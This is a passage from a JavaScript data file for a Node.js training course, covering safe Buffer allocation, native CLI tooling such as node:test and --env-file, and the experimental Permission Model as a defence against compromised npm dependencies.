                hint: 'What does allocUnsafe initialize the memory bytes to?',
                solution: `Buffer.alloc(size):
Allocates a new buffer and zeroes out every single byte in memory. It is completely clean and safe, but has a slight performance cost.

Buffer.allocUnsafe(size):
Allocates memory segments without zeroing them out. It is faster, but the memory may contain sensitive remnants of previous operations (passwords, auth tokens, database credentials). If transmitted uninitialized, it leaks memory data.`,
                explanation: 'Always use Buffer.alloc() unless immediately overwriting the entire buffer buffer slice.'
            },
            docLink: {
                title: 'Node.js Guide: Memory Management and GC',
                url: 'https://nodejs.org/en/learn/diagnostics/memory/using-heap-snapshot',
                description: 'Diagnosing memory leaks, taking heap snapshots, and V8 garbage collection tuning.'
            }
        },
        {
            id: 'node-12',
            title: 'Node CLI, Native Test Runner & Permission Models',
            estMinutes: 5,
            concept: {
                summary: 'Modern Node.js (v20+) eliminates many third-party tool dependencies: `--env-file=.env` loads environment variables natively without dotenv; `--watch` restarts files on save without nodemon; `node:test` provides a blazing-fast native test runner with assertions (`node:assert`) without Jest; and the experimental Permission Model (`--experimental-permission`) restricts filesystem, child process, and network access at the runtime boundary.',
                analogy: 'A smartphone app sandbox: rather than giving an installed app unrestricted access to your phone camera, storage, and contacts, the OS permission prompt asks whether you allow access to only the specific folder it needs.',
                seniorInsight: 'Leveraging native Node.js tooling reduces `node_modules` dependency bloat, slashes Docker image build times, and eliminates supply-chain vulnerabilities from unmaintained utility packages.'
            },
            trap: {
                title: 'Installing heavy external dependencies for features built directly into modern Node',
                juniorCode: `// ❌ JUNIOR: Installs dotenv, nodemon, and jest for simple microservices
// package.json dependencies: "dotenv", "nodemon", "jest", "ts-jest"
// 💥 Slower cold starts, 200MB heavier Docker image, higher vulnerability audit risks`,
                seniorCode: `// ✅ SENIOR: Native Node.js modern tooling (Zero dependencies)
// 1. Run server with native environment loading and file watching:
// node --env-file=.env --watch server.js

// 2. Native test suite with node:test and node:assert:
import test from 'node:test';
import assert from 'node:assert/strict';

test('Math calculation adds correctly', () => {
    assert.equal(2 + 2, 4);
});

test('Async function resolves expected user', async () => {
    const user = await Promise.resolve({ id: '1', role: 'ADMIN' });
    assert.deepEqual(user, { id: '1', role: 'ADMIN' });
});

// Run natively: node --test`,
                explanation: 'Native Node.js testing and environment loaders run significantly faster, eliminate configuration boilerplate, and shrink container footprints.'
            },
            drill: {
                question: 'What is the purpose of the Node.js Permission Model (`--experimental-permission`)?',
                hint: 'What happens if a compromised npm package attempts to read /etc/passwd or execute child processes?',
                solution: `The Permission Model restricts what system resources the Node.js process is authorized to access at runtime.
For example:
node --experimental-permission --allow-fs-read=/app/data server.js
If a malicious dependency attempts to read files outside /app/data or spawn child processes, Node.js throws an ERR_ACCESS_DENIED security error and halts execution.`,
                explanation: 'Runtime permissions restrict process capabilities to mitigate compromised supply chain packages.'
            },
            docLink: {
                title: 'Node.js Documentation: Permissions Model',
                url: 'https://nodejs.org/api/permissions.html',
                description: 'Configuring filesystem, child process, and worker thread restrictions in Node.js.'
            }
        }
    ]
};
